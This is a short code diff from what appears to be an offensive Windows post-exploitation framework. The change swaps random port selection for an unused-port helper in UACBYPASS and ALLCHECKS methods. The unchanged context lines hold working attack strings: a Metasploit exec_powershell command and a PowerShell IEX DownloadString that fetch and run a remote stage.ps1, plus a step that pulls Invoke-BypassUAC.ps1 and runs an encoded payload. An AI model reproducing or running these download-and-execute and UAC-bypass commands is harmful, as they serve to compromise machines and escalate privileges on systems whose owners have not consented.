@@ -26,7 +26,7 @@ class EXTRAS(object):
     def UACBYPASS(self, version):
         randomPort = FUNCTIONS().randomUnusedPort()
         uacbypassrcfilecontents = """run post/windows/manage/exec_powershell SCRIPT="IEX (New-Object Net.WebClient).DownloadString('http://%s:%s/stage.ps1')" SESSION=1"""% (FUNCTIONS().CheckInternet(), randomPort)
-        moduleport = random.randint(5000,9000)
+        moduleport = FUNCTIONS().randomUnusedPort()
         FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), "", "./externalmodules", port = moduleport, printIt = False)
         if version == "7":
             uacbypassfilecontent = """IEX (New-Object Net.WebClient).DownloadString("http://%s:%s/Invoke-BypassUAC.ps1");\nInvoke-BypassUAC -Command \"powershell -enc %s\" """ % (
@@ -46,7 +46,7 @@ class EXTRAS(object):
             return self.ez2read_shellcode
 
     def ALLCHECKS(self):
-        moduleport = random.randint(5000,9000)
+        moduleport = FUNCTIONS().randomUnusedPort()
         FUNCTIONS().DoServe(FUNCTIONS().CheckInternet(), "", "./externalmodules", port = moduleport, printIt = False)
         with open('allchecks.ps1', 'w') as allchecksfile:
             allchecksfile.write(
